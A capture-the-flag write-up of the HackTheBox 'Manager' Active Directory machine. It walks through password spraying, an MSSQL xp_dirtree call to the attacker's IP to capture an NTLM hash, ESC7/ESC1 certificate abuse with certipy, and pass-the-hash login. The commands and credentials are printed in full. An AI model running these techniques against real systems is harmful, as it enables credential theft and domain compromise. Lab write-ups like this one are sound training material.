---
title: "Manager HackTheBox" 
date: 2025-07-16 23:50:00 0000+
tags: [WriteUp, Manager, HTB, Enumeration, Active Directory, ADCS, MSSQL, Password Spraying, Bloodhound, Rusthound-CE, ESC1, ESC7, Privilege Escalation, Windows]
categories: [WriteUps, HackTheBox]
image:
  path: /assets/images/Manager_HTB/preview_manager.png
---
# Manager HTB Writeup

Manager is the medium level HackTheBox machine which focuses mainly on enumeration with rusthound-ce and bloodhound, mssql misconfigurations, bad passwords and finally dangerous permissions on domain users to manage ca’s which enables us to do ESC7 and then ESC1 to get the administrator hash finally rooting the box.

![image.png](/assets/images/Manager_HTB/image.png)

## Initial Enumeration

As always using rustmap.py to find open ports and services running on the box.

```bash
rustmap.py -ip 10.129.238.6
```

![image.png](/assets/images/Manager_HTB/image%201.png)

![image.png](/assets/images/Manager_HTB/image%202.png)

![image.png](/assets/images/Manager_HTB/image%203.png)

![image.png](/assets/images/Manager_HTB/image%204.png)

Looking at the above results we add dc01.manager.htb to our /etc/hosts file.

### DNS Enumeration

Since the port 53 is open on the box we did dns enumeration using dig.

```bash
dig @dc01.manger.htb manager.htb TXT
```

![image.png](/assets/images/Manager_HTB/image%205.png)

Dig doesn’t able to find anything useful.

### Web Enumeration

Now lets just proceed with the web enumeration as port 80 is open on the box.

Looking at the webpage we found only one potential user which is **JOHNDUE@manager.htb**

![image.png](/assets/images/Manager_HTB/image%206.png)

Lets try running **ffuf**.

```bash
ffuf -u http://manager.htb -H "Host:FUZZ.manager.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -rate 200 -ac
```

![image.png](/assets/images/Manager_HTB/image%207.png)

It was unsuccessful.

Lets try running gobuster for directory busting.

```bash
gobuster dir -u http://10.129.238.6/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -t 100 -b 403,404
```

![image.png](/assets/images/Manager_HTB/image%208.png)

Found several directories but we dont have permissions to view or list the directory structure.

### SMB Enumeration

Now lets just enumerate SMB as 139 and 445 ports are open on the box.

```bash
nxc smb manager.htb -u '' -p ''
```

![image.png](/assets/images/Manager_HTB/image%209.png)

we have null authentication enabled but cant list shares.

Lets try with the guest authentication.

```bash
nxc smb manager.htb -u '.' -p ''
```

![image.png](/assets/images/Manager_HTB/image%2010.png)

We have guest authentication allowed and we can list shares.

Checked the IPC$ share and didn’t find anything useful.

---

Now lets just proceed with the RID Bruteforce attack to get the list of usernames and groups in the domain.

```bash
nxc smb manager.htb -u '.' -p '' --rid-brute
```

![image.png](/assets/images/Manager_HTB/image%2011.png)

Created a usernames.txt and added all these users to it.

Removing extra entries form usernames.txt we deduce it to this.

```
administrator
guest
krbtgt
SQLServer2005SQLBrowserUser$DC01
zhong
cheng
ryan
raven
johndue
jinWoo
chinHae
operator
```

We have the usernames list, but we do not have the passwords.

### MSSQL Enumeration

With the gathered usernames list I tried the password spray with the usernames.txt only to the mssql service running on port 1433.

```bash
nxc mssql manager.htb -u usernames.txt -p usernames.txt --no-bruteforce --continue-on-success
```

![image.png](/assets/images/Manager_HTB/image%2012.png)

We got a hit as operator:operator.

So we can authenticate as operator with mssql service.

## Shell as Raven

Connecting to the mssql using impacket-mssqlclient.

```bash
impacket-mssqlclient -p 1433 manager.htb/'operator':'operator'@manager.htb
```

![image.png](/assets/images/Manager_HTB/image%2013.png)

Tried doing normal authentication but it failed to authenticate.

Now using the windows authentication to connect to the mssql server.

```bash
impacket-mssqlclient -p 1433 manager.htb/'operator':'operator'@manager.htb -windows-auth
```

![image.png](/assets/images/Manager_HTB/image%2014.png)

And we are in !!!

Tried to do enable the xp_cmdshell but it failed, so tried witht the xp_dirtree and exploit the UNC path vulnerability.

```bash
xp_dirtree //10.10.14.10/something
responder -I tun0
```

![image.png](/assets/images/Manager_HTB/image%2015.png)

![image.png](/assets/images/Manager_HTB/image%2016.png)

This resulted in successfully capturing the hash of the **MANAGER ACCOUNT.**

Saved this hash to a hashes.txt file.

Now lets crack this hash using Hashcat.

But hashcat failed to crack the hash of the Manager account.

So lets just enumerate through the mssql server only.

![image.png](/assets/images/Manager_HTB/image%2017.png)

Upon enumerating we found a web archive present in the c:/inetpub/wwwroot.

Since this is the web root we can download this archive using wget.

```bash
wget http://manager.htb/website-backup-27-07-23-old.zip
```

![image.png](/assets/images/Manager_HTB/image%2018.png)

Unzipped the web archive file and searched for the potential passwords

```bash
grep -r -n "pass"
```

![image.png](/assets/images/Manager_HTB/image%2019.png)

Found this interesting password in the **.old-conf.xml** file potentially for the user **Raven.**

Lets just add this password to our passwords.txt file and proceed with the password spray attack.

Performing the password spray attack using the password found.

```bash
nxc ldap manager.htb -u usernames.txt -p 'R4v3nBe5tD3veloP3r!123' --continue-on-success
```

![image.png](/assets/images/Manager_HTB/image%2020.png)

Found three valid hits with the johndue, SQLServer2005SQLBrowserUser$DC01 and raven.

We see that there’s an ldap bind error which means John’s account and the SQL server account these accounts are validating only through guest sessions.

We can confirm this by trying WinRM access.

```bash
nxc winrm manager.htb -u usernames.txt -p 'R4v3nBe5tD3veloP3r!123' --continue-on-success
```

![image.png](/assets/images/Manager_HTB/image%2021.png)

It says pwned! means we have elevated privileges as user **raven.**

```bash
evil-winrm -i manager.htb -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'
```

![image.png](/assets/images/Manager_HTB/image%2022.png)

Successfully logging in and grabbing the user.txt.

---

Since we have valid credentials we can do bloodhound enumeration.

### Bloodhound

For the bloodhound enumeration we are gonna use the rusthound-ce ingestor as it also collects the Active Directory Certificate Services data too.

```bash
rusthound-ce -d manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123' -z
```

![image.png](/assets/images/Manager_HTB/image%2023.png)

Uploading this zip file to the Bloodhound-CE for analysis.

Analyzing the bloodhound data..

![image.png](/assets/images/Manager_HTB/image%2024.png)

As Raven we can enroll certs form the MANAGER-DC01-CA.

## Shell as Administrator

Using certipy to find the vulnerable templates.

```bash
certipy find -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.238.7 -vulnerable -text -enabled
```

![image.png](/assets/images/Manager_HTB/image%2025.png)

Looking at the .txt file created.

```
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
    [+] User ACL Principals             : MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
Certificate Templates                   : [!] Could not find any certificate templates

```

Due to dangerous permissions as Raven it is vulnerable to ESC7.

### ESC7

```bash
certipy ca -ca 'MANAGER-DC01-CA' -dc-ip 10.129.238.7 -u raven -p 'R4v3nBe5tD3veloP3r!123' -add-officer raven
```

![image.png](/assets/images/Manager_HTB/image%2026.png)

Now enabling the certificate template **subCA.**

**Explanation:**

- Users with the Manage Certificate Authority (CA) and Manage Certificates access rights can issue failed certificate requests.
- The SubCA certificate template is vulnerable to ESC1, but only administrators can enroll in the template.
- A user can request a certificate from the SubCA. This request will be denied initially; however, the manager can approve it and then issue the certificate.
- Note: The SubCA certificate template is enabled by default but can also be enabled by utilizing Manage Certificate Authority (CA) and Manage Certificates access rights if it has been disabled by the admin.

```bash
certipy ca -ca 'MANAGER-DC01-CA' -dc-ip 10.129.238.7 -u raven -p 'R4v3nBe5tD3veloP3r!123' -enable-template SubCA
```

![image.png](/assets/images/Manager_HTB/image%2027.png)

Now we can request a certificate using the SubCA template, and as the request is denied we save the **primary key** and note the **request id.**

```bash
certipy req -ca 'MANAGER-DC01-CA' -dc-ip 10.129.238.7 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -template SubCA -upn administrator@manager.htb
```

![image.png](/assets/images/Manager_HTB/image%2028.png)

Successfully saved the private key and the request ID.

Now we issue the request using the -issue-request

```bash
certipy ca -ca 'MANAGER-DC01-CA' -dc-ip 10.129.238.7 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -issue-request 22
```

![image.png](/assets/images/Manager_HTB/image%2029.png)

Now after issuing the certificate we request our issue-request using the request id.

### ESC1

After doing the above steps we are exploiting ESC1 in one or another way.

```bash
certipy req -ca 'MANAGER-DC01-CA' -dc-ip 10.129.238.7 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -template 'SubCA' -target dc01.manager.htb -upn administrator@manager.htb -retrieve 22
```

![image.png](/assets/images/Manager_HTB/image%2030.png)

Since now we have the administrator.pfx we can authenticate with it.

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.238.7
```

![image.png](/assets/images/Manager_HTB/image%2031.png)

We have the administrator hash, using evil-winrm to authenticate with administrator.

```bash
evil-winrm -i manager.htb -u Administrator -H ae5064c2f62317332c88629e025924ef
```

![image.png](/assets/images/Manager_HTB/image%2032.png)

Grabbing that root.txt and submitting it.

Thankyou guys for reading !!

![image.png](/assets/images/Manager_HTB/image%2033.png)
